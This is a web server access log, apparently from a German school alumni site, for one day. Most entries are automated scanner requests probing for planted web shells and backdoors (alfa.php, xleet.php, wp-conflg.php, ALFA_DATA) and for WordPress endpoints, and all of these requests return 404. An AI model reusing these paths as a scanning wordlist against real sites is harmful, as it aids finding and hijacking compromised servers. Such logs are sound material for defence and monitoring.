12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:15;;/wp-includes/certificates/plugins.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:15;;/wp-content/themes/seotheme/mar.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:15;;/wp-admin/network/plugins.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-admin/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/gmo.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-includes/ID3/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/css/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-admin/includes/xmrlpc.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-includes/SimplePie/wp-login.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-content/themes/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/filemanager/dialog.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:16;;/wp-admin/maint/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/wp-includes/Requests/Text/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/wp-includes/customize/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/index/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/uploads/autoload_classmap.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/wp-includes/style-engine/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/ww1.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/qqq.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/about/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:17;;/wp-includes/theme-compat/chosen.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/admin/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/css/colors/blue/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-content/plugins/pwnd/as.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-admin/setup-config.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-admin/user/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-admin/js/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-content/upgrade/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-includes/assets/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:18;;/wp-content/radio.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/wp-includes/fonts/index.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/.well-known/gecko-litespeed.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/.well-known/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/wp-content/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/wp-content/plugins/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/.well-known/log.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/class.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/bless.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:19;;/wp-includes/js/codemirror/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/wp-includes/block-patterns/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/lock360.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/bge.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/ifm.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/thxt.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/kairolin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-19 10:04:20;;/siln.php;GET;404
68dc3c989e6b531ede9c293187f37689d0b20a7704c450e978d5b22427b2ca4f;2025-11-19 10:12:18;;/;GET;200
bd99f03c365cf4e7a4d70f3a52cfd237a7d6db06108d95d05111a45e87f9ef3d;2025-11-19 10:15:20;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 10:38:37;/themen/details/fotografie-als-kunst-und-ausdruck;/profile;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 10:38:38;/themen/details/fotografie-als-kunst-und-ausdruck;/login;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-19 10:40:00;/personen/alumni/details/sidney-dittrich;/personen/alumni/details/sidney-dittrich;GET;200
74d56dbcd52e2686b8998928d9a615634b6eb2a7b380b5731b30aa1bf54a2df4;2025-11-19 10:42:51;;/plugins/content/apismtp/apismtp.php?test=hello;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;/;GET;200
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//xmlrpc.php?rsd;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;/;GET;200
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//blog/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//web/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//website/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:42;;//wp/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//news/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//2018/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//2019/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//shop/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//wp1/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//test/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//media/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//wp2/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//site/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//cms/wp-includes/wlwmanifest.xml;GET;404
0c2284fa552f707d526e36d0b573b2448520f53fbb3c9d285e7d01741c3adede;2025-11-19 10:45:43;;//sito/wp-includes/wlwmanifest.xml;GET;404
9e5c511176b612a7a107bff7a6b4e605c080bfdd8649e2ff2cd3feaba64e84ce;2025-11-19 10:53:59;/;/;GET;200
04f5deaad70bdf943a45d4bf7260b4aaa02cb43b074627b334c4b5265bc4f415;2025-11-19 11:06:24;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-19 11:14:30;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/5511;GET;200
a5752949571af38d5b638204ccf5235a6ea4f886d309c63f0b1e9745b9420893;2025-11-19 11:17:17;;/index.htm;GET;404
60d81a2f96c65209d491824ee8afcc46570005f68ecb60d986c2632e23641ea8;2025-11-19 11:27:19;;/personen/all/4;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-19 11:39:12;/gruppen/hobby/biologie;/gruppen/hobby/robotik;GET;302
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-19 11:39:13;/gruppen/hobby/biologie;/gruppen;GET;200
d7f3f6cd2630c4265c4d48f9fdd8a68f86fedfabcec6f7d476d48885636047a3;2025-11-19 11:39:35;;/index.html;GET;404
d487a9c728e6d8eb50d8f3d6dd557df30fb31d6f9ca5c3a69151a83677af38ce;2025-11-19 11:41:16;/;/;GET;200
c8833258c553db2374f271a358501b8687ce83814ee9ba2c2e4132cf6bbf17f4;2025-11-19 11:47:16;;/;GET;200
5604d377d4094951a6cf0f5230fabf8e5a3dc814de21503b097406b2738dbde2;2025-11-19 11:49:25;;/;GET;200
ce1fd8900887aaf6002e68c006889813857baf1e4e17f0f231208b7293c6aa3c;2025-11-19 11:52:09;;/sitemap.txt;GET;404
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-19 11:52:15;;/;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-19 12:04:47;/personen/all/4;/personen/all/5;GET;200
e7a3ffa0208488effe1639f157bc7ee466548753943e9d26c6e619a590cd2769;2025-11-19 12:05:54;;/bitbucket-pipelines.yml;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 12:06:10;/gruppen/plausch/schulband-statt-fliessband;/gruppen/plausch/schulband-statt-fliessband;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 12:06:11;/gruppen/plausch/schulband-statt-fliessband;/gruppen/hobby/musikinstrumente-spielen;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 12:06:13;/gruppen/plausch/schulband-statt-fliessband;/gruppen;GET;200
de7c350531ac92d7b91203c2aece565580fbdc2f434d54bf070289b2e733c8a4;2025-11-19 12:11:09;;/;GET;200
9ee9a0c63a82fbb5eeefa508fed67b79b72b38dbdabdc4159a2757e7c4b1d778;2025-11-19 12:18:08;;/;GET;200
b0b2829ccbd2efd35bcc68906b4504feb29bbc3543b4018664ba5aaad3987efa;2025-11-19 12:18:16;;/;GET;200
a90af479bd045b3f0e04d85f562a143e716d3a6432a40d24e753da352ee244c2;2025-11-19 12:19:35;;/;GET;200
9f734081c76797b94b8daf12e08725c25b0bf5b65991a86e527260f087ec0cb6;2025-11-19 12:34:09;;/personen/alumni/schule/04A04;GET;200
748e0f7f04a74f2ecefff748b46a559853ab6316428689042d388d7630ebceee;2025-11-19 12:34:31;;/personen/alumni/schule/04A04;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-19 12:37:52;;/;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-19 12:37:52;;/;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-19 12:37:52;;/;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-19 12:37:52;;/;GET;200
73c90c1ff3769c04338d0eb38478a6f65937dea6d0f8166ff231844175b9acc7;2025-11-19 12:38:14;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 12:43:40;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/4540118;GET;200
248fd95664548b86ca2725400f81e0f9509885ef75157ae2de91cbe4298f5614;2025-11-19 12:45:14;;/;GET;200
41fa0cb1a1748f946d0b6ce4798d7dce2faeaad848fe9f304a7e62931c2240a9;2025-11-19 12:46:02;;/;GET;200
41fa0cb1a1748f946d0b6ce4798d7dce2faeaad848fe9f304a7e62931c2240a9;2025-11-19 12:51:49;;/webui/;GET;404
9e5c511176b612a7a107bff7a6b4e605c080bfdd8649e2ff2cd3feaba64e84ce;2025-11-19 12:55:36;;/;GET;200
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:38;;//wp-includes/ID3/license.txt;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:38;;//feed/;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:38;;//xmlrpc.php?rsd;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:38;;//blog/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:38;;//web/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:39;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:40;;//wp/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:40;;//2020/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//2019/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//2021/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//shop/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//wp1/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//test/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//site/wp-includes/wlwmanifest.xml;GET;404
d9f77a6871e130ba4e73fc87359fbd47fea6cf5b583484c8100f14efa5529f34;2025-11-19 12:55:41;;//cms/wp-includes/wlwmanifest.xml;GET;404
41fa0cb1a1748f946d0b6ce4798d7dce2faeaad848fe9f304a7e62931c2240a9;2025-11-19 12:56:45;;/;GET;200
3b90098a1a6de859dc3b7e081ce3c25698987e12f02a51578ddbe7f7ceb5d369;2025-11-19 13:00:49;;/;GET;200
c098d145fc7405a472a79eed40088757d53ea54d09b03215bd7cabecdf2a7a30;2025-11-19 13:01:36;;/personen;GET;200
41fa0cb1a1748f946d0b6ce4798d7dce2faeaad848fe9f304a7e62931c2240a9;2025-11-19 13:14:42;;/geoserver/web/;GET;404
2137ad9d7343fdccae6822c75822651477f3d7242cae17855b834c86ade634ac;2025-11-19 13:21:40;;/app_dev.php/_profiler/phpinfo;GET;404
bc82e20a9fa8561fe2a9af15fd09b5491c089a9a1e6b10ce9c8c265e3a6787f3;2025-11-19 13:28:13;;/developmentserver/metadatauploader;GET;404
371d82730df320ea235b15ce699d831de7d6f3130bf7c0fc9ebc6ba834b5a90b;2025-11-19 13:32:52;;/;GET;200
55ba1f31e330352661b43d3275dad2a303675546c75fe98bef1d75f73056674c;2025-11-19 13:37:29;;/;GET;200
897e09f7e3d920d419492a9a35afe85423c211b17bdef3a91e03f1615dbbacca;2025-11-19 13:44:11;;/;GET;200
bd99f03c365cf4e7a4d70f3a52cfd237a7d6db06108d95d05111a45e87f9ef3d;2025-11-19 13:44:59;;/?page=docs-sql;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-19 13:45:00;;/?page=docs-sql;GET;200
2c8d93f41808380296ca4cc27d389d2c04ba5ccf13bdb240932ab557eb69eefa;2025-11-19 14:10:13;/media/system/js/core.js;/media/system/js/core.js;GET;404
2c8d93f41808380296ca4cc27d389d2c04ba5ccf13bdb240932ab557eb69eefa;2025-11-19 14:10:14;/wp-includes/js/jquery/jquery.js;/wp-includes/js/jquery/jquery.js;GET;404
1f0f3c2f56c4208033c951bbc50b83084020423a5510e0958b021d16c715c392;2025-11-19 14:19:40;;/;GET;200
490e7dbdd5f8e0f8f0ea169ef46f8f3b6ad3242d4187a828b9f0d3402bccf486;2025-11-19 14:19:40;;/apple-touch-icon-120x120-precomposed.png;GET;404
490e7dbdd5f8e0f8f0ea169ef46f8f3b6ad3242d4187a828b9f0d3402bccf486;2025-11-19 14:19:41;;/apple-touch-icon-120x120.png;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:30;/;/aa.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:31;/;/abcd.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:32;/;/admin.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:32;/;/.__info.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:32;/;/info.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:33;/;/xmlrpc.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:33;/;/ALFA_DATA/admin.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:34;/;/aaa.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:34;/;/about.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:34;/;/admin/admin.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:35;/;/adminfuns.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:35;/;/akcc.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:36;/;/alfa.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:36;/;/build.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:37;/;/buy.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:37;/;/chosen.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:37;/;/classwithtostring.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:38;/;/default.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:39;/;/edit.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:39;/;/file.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:40;/;/filemanager.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:40;/;/flower.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:41;/;/function/function.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:41;/;/images/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:42;/;/images/images/about.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:42;/;/ioxi-o.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:43;/;/mari.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:43;/;/moon.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:43;/;/nc4.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:44;/;/wp-admin/about.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:44;/;/wp-admin/css/colors/blue/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:45;/;/wp-content/upgrade/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:45;/;/wp-includes/style-engine/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:46;/;/xleet.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:46;/;/wp-admin/includes/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:47;/;/wp-content/uploads/admin.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:47;/;/wp-good.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:48;/;/wp-includes/Text/Diff/Renderer/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:48;/;/wp-includes/style-engine/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:49;/;/xmrlpc.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:49;/;/asasx.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:50;/;/autoload_classmap.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:51;/;/cong.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:52;/;/file2.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:52;/;/wp-content/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:53;/;/wp-content/plugins/yanierin/akcc.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:53;/;/wp-content/uploads/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:54;/;/wp-content/wp-conflg.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:54;/;/wp-cron.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:55;/;/wp-includes/IXR/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:56;/;/wp-includes/block-supports/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:57;/;/wp-includes/fonts/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:57;/;/wp-includes/fonts/index.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:57;/;/wp-includes/js/crop/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:58;/;/wp-includes/rest-api/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:58;/;/wp-includes/widgets/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:59;/;/ds.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:26:59;/;/f5.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:00;/;/god4m.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:00;/;/test1.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:01;/;/uploads/;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:01;/;/0.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:02;/;/07.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:02;/;/dropdown.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:02;/;/makeasmtp.php;GET;404
ae620bf57f94a2438301925cd0f9c0f93eebc8c734956dafcefcb104372af197;2025-11-19 14:27:03;/;/wp-sigunq.php;GET;404
